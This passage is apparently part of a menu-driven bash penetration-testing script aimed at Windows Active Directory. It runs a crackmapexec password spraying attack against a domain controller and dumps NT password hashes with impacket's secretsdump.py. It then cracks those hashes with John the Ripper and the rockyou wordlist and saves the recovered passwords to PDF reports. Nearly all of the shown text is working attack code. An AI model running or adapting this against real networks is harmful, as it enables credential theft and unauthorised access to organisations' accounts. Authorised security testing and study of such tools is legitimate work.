                        	echo -e "$red[!] Domain Controller address not yet set!$endcolor"
                        	read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a Domain Controller address: $endcolor")" dcip
                			if [[ $dcip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]  
                        			then
                        			echo -e "$green[!] IP address is valid$endcolor"
                        			else
                        			echo -e "$red[!] IP address is invalid! Returning to main menu$endcolor" ; sleep 2 ; clear ; menu
                			fi
				echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using given password list...$endcolor"
                		crackmapexec smb $dcip -u $adusr -p $list --continue-on-success > spray
                		echo -e "$blue[+] Saving Data...$endcolor\n"
                		enscript spray -p Inter_Spray 2>/dev/null
                		ps2pdf Inter_Spray Intermediate_Exploitation_$dcip.pdf 2>/dev/null
                		rm Inter_Spray
                		rm spray
				sleep 0.3
				else


				echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using given password list...$endcolor"
	        		crackmapexec smb $dcip -u $adusr -p $list --continue-on-success > spray
        			echo -e "$blue[+] Saving Data...$endcolor\n"
                		enscript spray -p Inter_Spray 2>/dev/null
                		ps2pdf Inter_Spray Intermediate_Exploitation_$dcip.pdf 2>/dev/null
                		rm Inter_Spray
                		rm spray
				cd ..
				sleep 0.3
				echo -e "$cyan[*]$endcolor$yellow Password spraying attack concluded. Returning to main menu...$endcolor\n"
			fi
	fi
	
	
	
fi

sleep 2 ; clear ; menu
 
;;

A)
if [ -z $adusr ];
        then
        echo -e "$red[!] This exploitation level requires credentials. Please enter username credentials in the$endcolor $cyan[V]ariables$endcolor$red section.$endcolor\n"
        sleep 0.3
        echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
        sleep 1 ; clear ; menu
        else
        echo -e "$red[*] Advanced exploitation was selected$endcolor\n"
	sleep 0.5 
        if [ -z $adpw ]
                then
                echo -e "$red[!] This enumeration level requires credentials. Please enter password credentials in the$endcolor $cyan[V]ariables$endcolor$red section.$endcolor\n"
                sleep 0.3
                echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
                sleep 1 ; clear ; menu
                else
                cd $folder.$ts    
                if [ -z ${dcip+x} ];
                        then
                        echo -e "$red[!] Domain Controller address not yet set!$endcolor"
                        read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a Domain Controller address: $endcolor")" dcip
                		if [[ $dcip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]  
                        		then
                        		echo -e "$green[!] IP address is valid$endcolor"
                        		else
                        		echo -e "$red[!] IP address is invalid! Returning to main menu$endcolor" ; sleep 2 ; clear ; menu
                		fi
                        echo -e "\n$cyan[*]$endcolor$yellow Attempting password hash extraction and cracking...$endcolor"
			 
                        cp /usr/share/doc/python3-impacket/examples/secretsdump.py ./secretsdump.py          
                        python3 secretsdump.py "$domain"/"$adusr":"$adpw"@"$dcip" > hash 2> /dev/null
                        if [ -f $list ]
                                then
                                rm /root/.john/john.pot 2>/dev/null
                                john --format=NT --wordlist=$list hash > tkt 2>/dev/null
                                echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
                                else
                                cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
                                rm /root/.john/john.pot 2>/dev/null
                                john --format=NT --wordlist=rockyou.txt hash > tkt 2>/dev/null
                                echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
                        fi

                        rm hash
                        echo -e "$blue[+] Saving Data...$endcolor\n"
                        enscript tkt -p tktcrack 2>/dev/null
                        ps2pdf tktcrack Advanced_Exploitation_$dcip.pdf 2>/dev/null
                        rm tktcrack
                        rm tkt
			rm secretsdump.py
                        sleep 0.3
                        cd ..

                        echo -e "$cyan[*]$endcolor$yellow Hash extraction and cracking attempt concluded. Returning to main menu...$endcolor\n"
                        sleep 2 ; clear ; menu
                        
                        
                        
                        else
                        echo -e "\n$cyan[*]$endcolor$yellow Attempting password hash extraction and cracking...$endcolor"
			
			cp /usr/share/doc/python3-impacket/examples/secretsdump.py ./secretsdump.py
			python3 secretsdump.py "$domain"/"$adusr":"$adpw"@"$dcip" > hash 2> /dev/null
			if [ -f $list ]
				then
				rm /root/.john/john.pot 2>/dev/null
				john --format=NT --wordlist=$list hash > tkt 2>/dev/null
				echo -e "\n[*] Impacket Hash extraction results:\n" >> tkt
				cat hash >> tkt 2>/dev/null
				echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
				else
				cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
				rm /root/.john/john.pot 2>/dev/null
				john --format=NT --wordlist=rockyou.txt hash > tkt 2>/dev/null
				echo -e "\n[*] Impacket Hash extraction results:\n" >> tkt
				cat hash >> tkt 2>/dev/null
				echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
				rm ./rockyou.txt
			fi

			rm hash
                        echo -e "$blue[+] Saving Data...$endcolor\n"
                        enscript tkt -p tktcrack 2>/dev/null
                        ps2pdf tktcrack Advanced_Exploitation_$dcip.pdf 2>/dev/null
                        rm tktcrack
                        rm tkt
			rm secretsdump.py
                        sleep 0.3
                        cd ..
                        echo -e "$cyan[*]$endcolor$yellow Hash  extraction and cracking attempt concluded. Returning to main menu...$endcolor\n"
                        sleep 2 ; clear ; menu
                fi

	fi
fi






;;

M) clear ; sleep 0.3 ; menu
;;
H) sleep 0.3 ; manual
;;
*) 
echo -e "$red[!]Invalid input.$endcolor$yellow - Please choose between$endcolor $blue[B]$endcolor$yellow,$endcolor $green[I]$endcolor$yellow or$endcolor $red[A]$endcolor" ; sleep 0.3 ; netexploit
;;
esac

}




fig


